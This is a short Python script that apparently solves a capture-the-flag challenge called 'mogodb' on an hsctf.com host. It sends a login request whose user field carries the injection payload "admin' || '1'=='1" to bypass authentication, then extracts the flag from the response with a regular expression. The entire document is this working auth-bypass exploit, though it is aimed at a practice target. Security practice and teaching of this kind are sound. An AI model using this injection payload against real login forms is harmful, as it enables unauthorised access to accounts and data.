import requests
import re

url = "http://mogodb.hsctf.com/"

r = requests.post(url, data={
    "user": "admin' || '1'=='1",
    "password": "admin"
})

print(re.findall(r"flag{.*}", r.text)[0])